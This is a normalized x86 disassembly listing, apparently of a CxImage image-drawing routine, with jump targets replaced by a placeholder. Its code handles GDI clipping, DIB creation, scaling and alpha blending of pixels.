mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov edx [ ebp - 0x8 ]
and edx 0xff
test edx edx
jne r-xdata
mov esi esp
lea edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ GetClipBox@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp + 0x1c ]
push ecx
call [ CreateRectRgnIndirect@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x20 ] eax
mov esi esp
push 0x1
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ ExtSelectClipRgn@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x20 ]
push ecx
call [ DeleteObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
lea ecx [ ebp - 0xc8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ GetClipBox@IAT ]
cmp esi esp
call _chkesp
mov eax [ ebp - 0xc8 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ ebp - 0xc ]
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x1cc ] edx
mov ecx [ ebp - 0xc8 ]
mov [ ebp - 0x1cc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x17d ]
test edx edx
jne r-xdata
mov edx [ ebp - 0xc8 ]
cmp edx [ ebp + 0xc ]
jle r-xdata
mov ecx [ ebp - 0xc0 ]
mov [ ebp - 0x1d0 ] ecx
jmp r-xdata
mov eax [ ebp - 0xc0 ]
cmp eax [ ebp - 0x1cc ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
cmp ecx [ eax + 0xc ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x1d4 ] ecx
mov eax [ ebp - 0xc8 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
mov eax [ ebp - 0x1d0 ]
mov [ ebp - 0xd8 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp + 0x14 ]
cmp [ ebp - 0xc0 ] ecx
jge r-xdata
mov esi esp
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ GetClipBox@IAT ]
cmp esi esp
call _chkesp
mov edx [ ebp - 0x30 ]
cmp edx [ ebp + 0xc ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
cmp eax [ edx + 0x10 ]
jne r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x1d8 ] eax
mov edx [ ebp - 0xc0 ]
mov [ ebp - 0x1d8 ] edx
jmp r-xdata
mov edx [ ebp - 0x1d4 ]
mov [ ebp - 0x1d0 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x18c ] ecx
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x18c ] eax
jmp r-xdata
mov esi esp
push 0x3
mov ecx [ ebp + 0x8 ]
push ecx
call [ SetStretchBltMode@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp + 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ SetDIBitsToDevice@IAT ]
cmp esi esp
call _chkesp
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp + 0x14 ]
cmp [ ebp - 0xc0 ] eax
jge r-xdata
mov edx [ ebp - 0xc8 ]
mov [ ebp - 0x1dc ] edx
jmp r-xdata
mov ecx [ ebp - 0xc8 ]
cmp ecx [ ebp - 0x1d8 ]
jle r-xdata
mov ecx [ ebp - 0x30 ]
cmp ecx [ ebp + 0xc ]
jle r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x190 ] eax
jmp r-xdata
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x18c ]
jge r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp + 0x14 ]
mov [ ebp - 0x1e0 ] edx
mov ecx [ ebp - 0xc0 ]
mov [ ebp - 0x1e0 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1dc ]
mov [ ebp - 0xd0 ] ecx
mov edx [ ebp - 0xc4 ]
cmp edx [ ebp + 0x10 ]
jle r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x194 ] eax
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x194 ] edx
jmp r-xdata
mov edx [ ebp - 0x190 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp + 0xc ]
add eax [ ebp + 0x14 ]
cmp [ ebp - 0x28 ] eax
jge r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x1e4 ] ecx
mov eax [ ebp - 0xc4 ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov eax [ ebp - 0x1e0 ]
mov [ ebp - 0x1dc ] eax
mov edx [ ebp + 0xc ]
add edx [ ebp + 0x14 ]
mov [ ebp - 0x198 ] edx
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x198 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x194 ]
mov [ ebp - 0x190 ] ecx
mov eax 0x1
mov esi esp
lea ecx [ ebp - 0x1c ]
push ecx
call [ CreateRectRgnIndirect@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x178 ] eax
mov esi esp
push 0x2
mov edx [ ebp - 0x178 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ ExtSelectClipRgn@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x178 ]
push ecx
call [ DeleteObject@IAT ]
cmp esi esp
call _chkesp
mov ecx [ ebp - 0xc4 ]
cmp ecx [ ebp + 0x10 ]
jle r-xdata
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
mov edx [ ebp - 0xbc ]
cmp edx [ ebp - 0x1e4 ]
jge r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp + 0x14 ]
cmp [ ebp - 0x28 ] edx
jge r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x19c ] ecx
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x198 ]
jle r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1ec ] eax
mov edx [ ebp - 0xc4 ]
mov [ ebp - 0x1ec ] edx
jmp r-xdata
mov edx [ ebp - 0x1e8 ]
mov [ ebp - 0xd4 ] edx
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x18 ]
cmp [ ebp - 0xbc ] eax
jge r-xdata
mov ecx [ ebp + 0xc ]
add ecx [ ebp + 0x14 ]
mov [ ebp - 0x1a0 ] ecx
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x1a0 ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp + 0x10 ]
jle r-xdata
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x18 ]
mov [ ebp - 0x1f0 ] edx
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x1f0 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1ec ]
mov [ ebp - 0x1e8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1a4 ] eax
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x1a4 ] edx
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
mov [ ebp - 0x19c ] edx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x18 ]
cmp [ ebp - 0xbc ] edx
jge r-xdata
mov ecx [ ebp - 0xc4 ]
mov [ ebp - 0x1f4 ] ecx
jmp r-xdata
mov eax [ ebp - 0xc4 ]
cmp eax [ ebp - 0x1f0 ]
jle r-xdata
mov eax [ ebp - 0x2c ]
cmp eax [ ebp + 0x10 ]
jle r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x1a8 ] edx
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x1a4 ]
jge r-xdata
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0x1f8 ] ecx
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x1f8 ] eax
jmp r-xdata
mov eax [ ebp - 0x1f4 ]
mov [ ebp - 0xcc ] eax
mov ecx [ ebp - 0xd0 ]
sub ecx [ ebp - 0xd8 ]
mov [ ebp - 0xdc ] ecx
mov edx [ ebp - 0xcc ]
sub edx [ ebp - 0xd4 ]
mov [ ebp - 0xe0 ] edx
mov [ ebp - 0xe4 ] 0x0
mov [ ebp - 0xe3 ] 0x0
mov [ ebp - 0xe2 ] 0x0
mov [ ebp - 0xe1 ] 0x0
lea eax [ ebp - 0x180 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?GetTransColor@CxImage@@QAE?AUtagRGBQUAD@@XZ
mov ecx [ eax ]
mov [ ebp - 0xe8 ] ecx
lea edx [ ebp - 0xe4 ]
mov [ ebp - 0xec ] edx
lea eax [ ebp - 0xe8 ]
mov [ ebp - 0xf0 ] eax
mov ecx [ ebp - 0x4 ]
call ?GetTransIndex@CxImage@@QBEJXZ
mov [ ebp - 0xf4 ] eax
push 0x28
push 0x0
lea ecx [ ebp - 0x124 ]
push ecx
call memset
add esp 0xc
mov [ ebp - 0x124 ] 0x28
mov edx [ ebp - 0xdc ]
mov [ ebp - 0x120 ] edx
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0x1
mov [ ebp - 0x116 ] 0x18
mov esi esp
mov ecx [ ebp + 0x8 ]
push ecx
call [ CreateCompatibleDC@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x134 ] eax
mov esi esp
push 0x0
push 0x0
lea edx [ ebp - 0x128 ]
push edx
push 0x0
lea eax [ ebp - 0x124 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ CreateDIBSection@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x138 ] eax
mov esi esp
mov edx [ ebp - 0x138 ]
push edx
mov eax [ ebp - 0x134 ]
push eax
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x13c ] eax
mov esi esp
push 0xcc0020
mov ecx [ ebp - 0xd4 ]
push ecx
mov edx [ ebp - 0xd8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xe0 ]
push ecx
mov edx [ ebp - 0xdc ]
push edx
push 0x0
push 0x0
mov eax [ ebp - 0x134 ]
push eax
call [ BitBlt@IAT ]
cmp esi esp
call _chkesp
cmp [ ebp - 0x128 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x1ac ] edx
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x1ac ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x18 ]
cmp [ ebp - 0x24 ] edx
jge r-xdata
mov esi esp
push 0x0
lea edx [ ebp - 0x124 ]
push edx
mov eax [ ebp - 0x128 ]
push eax
mov ecx [ ebp - 0xe0 ]
push ecx
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0xe0 ]
push edx
mov eax [ ebp - 0xdc ]
push eax
mov ecx [ ebp - 0xd4 ]
push ecx
mov edx [ ebp - 0xd8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ SetDIBitsToDevice@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x13c ]
push ecx
mov edx [ ebp - 0x134 ]
push edx
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push eax
call [ DeleteObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov eax [ ebp - 0x134 ]
push eax
call [ DeleteDC@IAT ]
cmp esi esp
call _chkesp
mov eax [ ebp - 0xdc ]
imul eax eax 0x18
add eax 0x1f
cdq
and edx 0x1f
add eax edx
sar eax 0x5
shl eax 0x2
mov [ ebp - 0x15c ] eax
mov ecx [ ebp - 0xcc ]
mov [ ebp - 0x160 ] ecx
mov edx [ ebp - 0xd8 ]
mov [ ebp - 0x164 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
cmp ecx [ eax + 0xc ]
jne r-xdata
mov edx [ ebp - 0x1f8 ]
mov [ ebp - 0x1f4 ] edx
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0x1b0 ] ecx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1b0 ] eax
jmp r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebp - 0x1a8 ] eax
mov ecx [ ebp - 0x4 ]
fild [ ecx + 0xc ]
fidiv [ ebp + 0x14 ]
fstp [ ebp - 0x168 ]
mov edx [ ebp - 0x4 ]
fild [ edx + 0x10 ]
fidiv [ ebp + 0x18 ]
fstp [ ebp - 0x16c ]
mov [ ebp - 0x144 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
cmp eax [ edx + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x18 ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1b4 ] eax
jmp r-xdata
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x1b0 ]
jle r-xdata
mov ecx [ ebp - 0x144 ]
cmp ecx [ ebp - 0xe0 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp - 0x160 ]
add edx [ ebp + 0x10 ]
mov [ ebp - 0x150 ] edx
mov [ ebp - 0x144 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x18 ]
mov [ ebp - 0x1b8 ] eax
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x1b8 ] edx
jmp r-xdata
mov edx [ ebp - 0x1b4 ]
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x34 ]
sub ecx [ ebp - 0x3c ]
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x4b ] 0x0
mov [ ebp - 0x4a ] 0x0
mov [ ebp - 0x49 ] 0x0
push 0x28
push 0x0
lea edx [ ebp - 0x78 ]
push edx
call memset
add esp 0xc
mov [ ebp - 0x78 ] 0x28
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x74 ] eax
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] 0x1
mov [ ebp - 0x6a ] 0x18
mov esi esp
mov edx [ ebp + 0x8 ]
push edx
call [ CreateCompatibleDC@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x88 ] eax
mov esi esp
push 0x0
push 0x0
lea eax [ ebp - 0x7c ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ CreateDIBSection@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x8c ] eax
mov esi esp
mov eax [ ebp - 0x8c ]
push eax
mov ecx [ ebp - 0x88 ]
push ecx
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x160 ]
sub edx [ ebp - 0x144 ]
sub edx [ ebp + 0x10 ]
mov [ ebp - 0x1fc ] edx
fild [ ebp - 0x1fc ]
fmul [ ebp - 0x16c ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ ceil@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx eax
test edx edx
jge r-xdata
mov edx [ ebp - 0x144 ]
cmp edx [ ebp - 0xe0 ]
jge r-xdata
mov esi esp
push 0x0
lea edx [ ebp - 0x78 ]
push edx
mov eax [ ebp - 0x7c ]
push eax
mov ecx [ ebp - 0x48 ]
push ecx
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x3c ]
push ecx
mov edx [ ebp - 0x40 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ SetDIBitsToDevice@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x90 ]
push ecx
mov edx [ ebp - 0x88 ]
push edx
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
push eax
call [ DeleteObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov eax [ ebp - 0x88 ]
push eax
call [ DeleteDC@IAT ]
cmp esi esp
call _chkesp
mov eax [ ebp - 0x44 ]
imul eax eax 0x18
add eax 0x1f
cdq
and edx 0x1f
add eax edx
sar eax 0x5
shl eax 0x2
mov [ ebp - 0xa0 ] eax
mov edx [ ebp - 0x34 ]
mov [ ebp - 0xa4 ] edx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xa8 ] eax
mov ecx [ ebp - 0x4 ]
fild [ ecx + 0xc ]
fidiv [ ebp + 0x14 ]
fstp [ ebp - 0xac ]
mov edx [ ebp - 0x4 ]
fild [ edx + 0x10 ]
fidiv [ ebp + 0x18 ]
fstp [ ebp - 0xb0 ]
mov [ ebp - 0x98 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1b8 ]
mov [ ebp - 0x1b4 ] ecx
mov eax [ ebp - 0x160 ]
sub eax [ ebp - 0x144 ]
sub eax [ ebp + 0x10 ]
mov [ ebp - 0x204 ] eax
fild [ ebp - 0x204 ]
fmul [ ebp - 0x16c ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ ceil@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx eax
mov [ ebp - 0x200 ] edx
mov [ ebp - 0x200 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x150 ]
imul ecx [ eax + 0xc ]
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x164 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0x14c ] edx
mov eax [ ebp - 0x144 ]
imul eax [ ebp - 0x15c ]
mov ecx [ ebp - 0x128 ]
add ecx eax
mov [ ebp - 0x12c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x150 ]
imul eax [ edx + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
add edx eax
mov eax [ ebp - 0x14c ]
imul eax eax 0x3
add edx eax
mov [ ebp - 0x130 ] edx
mov [ ebp - 0x140 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebp - 0x140 ]
cmp eax [ ebp - 0xdc ]
jge r-xdata
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x174 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x174 ]
imul edx [ ecx + 0xc ]
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x144 ]
imul eax [ ebp - 0x15c ]
mov ecx [ ebp - 0x128 ]
add ecx eax
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x140 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x140 ]
cmp eax [ ebp - 0xdc ]
jge r-xdata
mov edx [ ebp - 0xa4 ]
sub edx [ ebp - 0x98 ]
sub edx [ ebp + 0x10 ]
mov [ ebp - 0x1bc ] edx
fild [ ebp - 0x1bc ]
fmul [ ebp - 0xb0 ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ ceil@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx eax
test edx edx
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x140 ]
add ecx [ ebp - 0x164 ]
sub ecx [ ebp + 0xc ]
mov [ ebp - 0x208 ] ecx
fild [ ebp - 0x208 ]
fmul [ ebp - 0x168 ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x170 ] eax
mov edx [ ebp - 0xc ]
and edx 0xff
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp - 0xa4 ]
sub eax [ ebp - 0x98 ]
sub eax [ ebp + 0x10 ]
mov [ ebp - 0x1c4 ] eax
fild [ ebp - 0x1c4 ]
fmul [ ebp - 0xb0 ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ ceil@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx eax
mov [ ebp - 0x1c0 ] edx
mov [ ebp - 0x1c0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x144 ]
add eax 0x1
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x154 ] 0xff
mov eax [ ebp - 0x148 ]
add eax [ ebp - 0x170 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1a0 ]
mov al [ edx + eax ]
mov [ ebp - 0x154 ] al
jmp r-xdata
mov eax [ ebp - 0x144 ]
add eax 0x1
mov [ ebp - 0x144 ] eax
mov ecx [ ebp - 0x150 ]
add ecx 0x1
mov [ ebp - 0x150 ] ecx
mov [ ebp - 0x154 ] 0xff
mov edx [ ebp - 0x148 ]
add edx [ ebp - 0x14c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1a0 ]
mov dl [ ecx + edx ]
mov [ ebp - 0x154 ] dl
jmp r-xdata
mov eax [ ebp - 0x94 ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
mov eax [ ebp - 0x1c0 ]
mov [ ebp - 0xb8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xb8 ]
imul edx [ ecx + 0xc ]
mov [ ebp - 0x9c ] edx
mov eax [ ebp - 0x98 ]
imul eax [ ebp - 0xa0 ]
mov ecx [ ebp - 0x7c ]
add ecx eax
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x94 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x174 ]
imul ecx [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
add eax ecx
mov ecx [ ebp - 0x170 ]
imul ecx ecx 0x3
add eax ecx
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x130 ]
mov al [ edx ]
mov [ ebp - 0xe4 ] al
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x130 ]
mov al [ edx ]
mov [ ebp - 0xe3 ] al
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x130 ]
mov al [ edx ]
mov [ ebp - 0xe2 ] al
mov edx [ ebp - 0x174 ]
push edx
mov eax [ ebp - 0x170 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
and eax 0xff
mov [ ebp - 0xf8 ] eax
mov ecx [ ebp - 0x174 ]
push ecx
mov edx [ ebp - 0x170 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
push eax
lea eax [ ebp - 0x184 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov ecx [ eax ]
mov [ ebp - 0xe4 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x17d ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x154 ]
and ecx 0xff
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x17c ]
add eax 0x1
imul ecx eax
sar ecx 0x8
mov [ ebp - 0x154 ] cl
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x130 ]
mov al [ edx ]
mov [ ebp - 0xe4 ] al
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x130 ]
mov al [ edx ]
mov [ ebp - 0xe3 ] al
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x130 ]
mov al [ edx ]
mov [ ebp - 0xe2 ] al
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x150 ]
push ecx
mov edx [ ebp - 0x14c ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
and eax 0xff
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0x150 ]
push eax
mov ecx [ ebp - 0x14c ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
push eax
lea edx [ ebp - 0x188 ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov eax [ eax ]
mov [ ebp - 0xe4 ] eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x17d ]
test edx edx
je r-xdata
mov eax [ ebp - 0x154 ]
and eax 0xff
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x17c ]
add edx 0x1
imul eax edx
sar eax 0x8
mov [ ebp - 0x154 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x94 ]
add ecx [ ebp - 0xa8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp - 0x1c8 ] ecx
fild [ ebp - 0x1c8 ]
fmul [ ebp - 0xac ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0xb4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0xf8 ]
cmp edx [ ebp - 0xf4 ]
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x154 ]
and ecx 0xff
mov edx [ ebp - 0xe1 ]
and edx 0xff
add edx 0x1
imul ecx edx
sar ecx 0x8
mov [ ebp - 0x154 ] cl
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax [ ebp - 0xf4 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x154 ]
and eax 0xff
mov ecx [ ebp - 0xe1 ]
and ecx 0xff
add ecx 0x1
imul eax ecx
sar eax 0x8
mov [ ebp - 0x154 ] al
mov eax [ ebp - 0x98 ]
add eax 0x1
mov [ ebp - 0x98 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xb8 ]
imul edx [ ecx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
add ecx edx
mov edx [ ebp - 0xb4 ]
imul edx edx 0x3
add ecx edx
mov [ ebp - 0x84 ] ecx
mov eax [ ebp - 0x84 ]
mov cl [ eax ]
mov [ ebp - 0x4c ] cl
mov edx [ ebp - 0x84 ]
add edx 0x1
mov [ ebp - 0x84 ] edx
mov eax [ ebp - 0x84 ]
mov cl [ eax ]
mov [ ebp - 0x4b ] cl
mov edx [ ebp - 0x84 ]
add edx 0x1
mov [ ebp - 0x84 ] edx
mov eax [ ebp - 0x84 ]
mov cl [ eax ]
mov [ ebp - 0x4a ] cl
mov eax [ ebp - 0xb8 ]
push eax
mov ecx [ ebp - 0xb4 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
push eax
lea edx [ ebp - 0x17c ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPaletteColor@CxImage@@QAE?AUtagRGBQUAD@@E@Z
mov eax [ eax ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and ecx 0xff
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0xec ]
mov edx [ ebp - 0xf0 ]
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
mov edx [ ebp - 0x154 ]
and edx 0xff
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
and edx 0xff
test edx edx
jne r-xdata
